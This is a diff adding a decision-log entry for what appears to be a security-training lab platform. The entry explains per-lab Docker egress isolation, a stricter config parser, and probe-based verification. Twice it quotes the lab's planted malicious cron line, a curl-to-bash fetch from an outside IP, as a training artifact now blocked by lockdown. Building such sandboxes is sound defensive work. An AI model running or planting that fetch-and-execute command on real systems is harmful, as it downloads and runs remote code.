@@ -2650,3 +2650,58 @@ silent when the broker simply is not running, which is the normal local
 state and not worth an error on page load.
 This also closes 048's recorded gap: an expired WS token is now recoverable,
 because reconnecting mints a fresh URL rather than needing a longer TTL.
+
+**050 · 2026-08-25 · Egress lockdown: one `Internal` Docker network per lab,
+and a config typo that fails loudly.**
+*Per-lab, not one shared internal network.* Both block the internet;
+only the per-lab version also stops labs reaching **each other**. A shared
+internal network would isolate learners from the outside while leaving
+lateral movement between them wide open — a worse problem than the one being
+solved, and an easy thing to build by accident because it looks simpler.
+`Internal: true` is the entire mechanism: Docker gives the network no
+gateway, so nothing on it can route off the host.
+*Checked before building:* the only network-touching commands in the image's
+fix scripts are two `apt-get purge` calls, and purge reads the local dpkg
+database rather than fetching. Worth noting the planted malicious cron
+(`curl http://198.51.100.23/x.sh | bash`) goes inert under lockdown, which is
+strictly better — a learner's sandbox should not make that request even as
+simulation, and the check grades the cron line's presence, not its success.
+*Network lifecycle is tied to the container's, carefully.* Created before
+the container and torn down on every failure path, because a network named
+after a container that never came up is a leak with nothing to reap it.
+On removal the name is read from `inspect` BEFORE the container is deleted —
+afterwards there is nothing left to derive it from.
+*The correction worth recording.* The first draft parsed `RZ_EGRESS` as
+`=== "deny" ? "deny" : "allow"`, with a comment arguing that the permissive
+default was safe because it only reaches loopback dev. That argument was
+wrong: it reasons about *auth*, not egress. A host can set
+`RZ_TOKEN_SECRET`, start perfectly happily, typo `RZ_EGRESS=Deny`, and
+silently run labs with full outbound access while believing they are
+contained — the exact failure the `Runtime` field is careful to avoid.
+An unrecognised value now throws `InvalidSandboxConfigError` at startup.
+Unset still means "allow", because that only ever applies locally and
+defaulting to deny would make every `npm run dev` build labs that behave
+unlike the documented ones.
+**Verified** against a real daemon via `lab-broker/scripts/probe-egress.sh`,
+which runs the same three checks twice — once on the default bridge as a
+control, once on an internal network — because "DNS failed" means nothing
+unless it succeeded in the baseline. Result: baseline resolves and connects,
+locked down blocks both, and **`apt-get purge` succeeds in both**, so the two
+purge-based fix scripts survive lockdown.
+Two process notes worth keeping. The first attempt was run as a nested
+one-liner through PowerShell → wsl → bash → docker → bash, and the quoting
+collapsed; it printed `PURGE=100`, which looks exactly like a real apt
+failure and was pure corruption. A probe worth trusting is a script file,
+not a quoted string. The second attempt then produced NO output and exited
+0, because `docker run ... bash -s` needs `-i` to attach stdin — a silent
+pass that would have been read as success. The probe now treats empty output
+as a failure, on the principle that a test which cannot fail is not
+evidence.
+`prove.sh` also takes `RZ_NETWORK` now, and the full four-state proof was
+re-run under lockdown: **all 32 checks, four states, and the trap demo score
+identically with no route off the host.** Purge working was one command;
+this is the actual claim.
+Confirmed incidentally by that run: the planted malicious cron
+(`curl http://198.51.100.23/x.sh | bash`) can no longer reach out, and the
+checks still score the same — so they grade the cron line's *presence*
+rather than its success, which is what a sandbox should do.
